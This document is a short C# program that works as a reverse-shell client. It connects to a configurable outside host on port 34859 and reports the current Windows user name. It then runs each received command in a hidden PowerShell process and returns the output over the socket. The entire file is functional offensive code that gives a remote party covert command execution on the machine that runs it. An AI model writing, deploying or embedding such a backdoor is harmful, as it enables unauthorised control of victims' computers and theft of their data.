using System;
using System.Text;
using System.Net.Sockets;
using System.Diagnostics;
using System.Net;

namespace Cli
{
    class Program
    {
        static void Main(string[] args)
        {
            // Check arguments
            var url = [YOUR_PUBLIC_IP];
            Uri myUri = new Uri(url);
            var IpAddress = Dns.GetHostAddresses(myUri.Host)[0].ToString() ;
            Int32 Port = 34859;
            String CommandPrompt = String.Empty;
            String Command;

            while (true)
            {
                try
                {
                    TcpClient client = new TcpClient(IpAddress, Port);
                    string userName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
                    Console.ForegroundColor = ConsoleColor.Yellow;
                    Console.WriteLine("[+] Connected to {0} on port {1}", IpAddress, Port);
                    Console.ForegroundColor = ConsoleColor.White;

                    while (true)
                    {
                        NetworkStream stream = client.GetStream();
                        byte[] sendBuffer = Encoding.Default.GetBytes(userName+"\n");
                        stream.Write(sendBuffer, 0, sendBuffer.Length);
                        CommandPrompt = "shell>";
                        sendBuffer = Encoding.Default.GetBytes(CommandPrompt);
                        stream.Write(sendBuffer, 0, sendBuffer.Length);

                        byte[] receiveBuffer = new byte[1024];
                        int ResponseData = stream.Read(receiveBuffer, 0, receiveBuffer.Length);

                        Array.Resize(ref receiveBuffer, ResponseData);
                        Command = Encoding.Default.GetString(receiveBuffer);

                        if (Command == "quit\n")
                        {
                            stream.Close();
                            client.Close();
                            break;
                        }

                        Process p = new Process();
                        p.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                        p.StartInfo.CreateNoWindow = true;
                        p.StartInfo.FileName = "powershell.exe";
                        p.StartInfo.Arguments = "-Command " + Command;
                        p.StartInfo.RedirectStandardOutput = true;
                        p.StartInfo.RedirectStandardError = true;
                        p.StartInfo.UseShellExecute = false;
                        p.Start();

                        String Output = p.StandardOutput.ReadToEnd();
                        String Error = p.StandardError.ReadToEnd();

                        byte[] OutputBuffer = Encoding.Default.GetBytes(Output);
                        byte[] ErrorBuffer = Encoding.Default.GetBytes(Error);

                        stream.Write(OutputBuffer, 0, OutputBuffer.Length);
                        stream.Write(ErrorBuffer, 0, ErrorBuffer.Length);

                    }
                }
                catch (ArgumentNullException e)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("[!] Error: {0}", e.Message);
                    Console.ForegroundColor = ConsoleColor.White;
                    System.Environment.Exit(1);
                }
                catch (SocketException e)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("[!] Error: {0}", e.Message);
                    Console.ForegroundColor = ConsoleColor.White;
                    System.Environment.Exit(1);
                }
                catch (System.IO.IOException e)
                {
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("[!] Error: {0}", e.Message);
                    Console.ForegroundColor = ConsoleColor.White;
                    System.Environment.Exit(1);
                }
            }
        }
    }
}
